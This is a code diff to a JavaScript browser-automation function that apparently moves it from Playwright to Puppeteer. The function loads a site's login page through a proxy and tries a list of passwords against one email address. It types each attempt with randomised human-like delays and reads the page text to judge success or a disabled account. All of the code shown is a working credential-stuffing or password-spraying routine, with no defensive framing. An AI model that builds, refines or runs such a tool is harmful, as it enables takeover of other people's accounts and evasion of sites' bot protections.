@@ -336,8 +336,8 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
         
         const started = Date.now();
         try {
-          await page.goto(loginUrl, { waitUntil: 'networkidle' });
-          await page.waitForSelector(submitSel, { state: 'visible' }).catch(() => {});
+          await page.goto(loginUrl, { waitUntil: 'networkidle2' });
+          await page.waitForSelector(submitSel, { visible: true }).catch(() => {});
 
           for (let i = 0; i < passwords.length; i++) {
             const pw = passwords[i];
@@ -350,15 +350,17 @@ async function testSiteAdvanced(provider, credentials, settings, proxy, site, lo
               if (pi) pi.value = '';
             });
 
-            await page.fill(userSel, email, { delay: Math.floor(Math.random() * 100) + 50 }).catch(() => {});
-            await page.fill(passSel, pw, { delay: Math.floor(Math.random() * 100) + 50 }).catch(() => {});
-            await page.click(submitSel).catch(() => {});
+            await page.type(userSel, email, { delay: Math.floor(Math.random() * 100) + 50 }).catch(() => {});
+            await page.type(passSel, pw, { delay: Math.floor(Math.random() * 100) + 50 }).catch(() => {});
+            await Promise.all([
+              page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 }).catch(() => {}),
+              page.click(submitSel).catch(() => {})
+            ]);
             
             const waitTime = i === 0 ? 400 : 700;
-            await page.waitForTimeout(waitTime);
-            await page.waitForTimeout(5600); 
+            await new Promise(r => setTimeout(r, waitTime + 5600));
 
-            const text = await page.innerText('body');
+            const text = await page.evaluate(() => document.body.innerText);
             const lowerText = text.toLowerCase();
             
             if (lowerText.includes('disabled') || lowerText.includes('has been disabled')) {
